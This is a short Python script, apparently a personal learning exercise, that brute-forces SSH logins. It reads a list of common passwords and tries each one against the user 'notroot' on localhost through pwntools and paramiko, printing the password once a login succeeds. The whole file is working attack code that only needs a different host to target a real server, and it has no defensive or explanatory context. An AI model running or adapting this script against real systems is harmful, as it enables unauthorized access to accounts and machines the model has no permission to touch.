import paramiko.ssh_exception
from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open(r"C:\Users\sarve\Downloads\Program\ssh_bruteforce\ssh-common-password.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}' !".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid Password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password!")
        attempts += 1
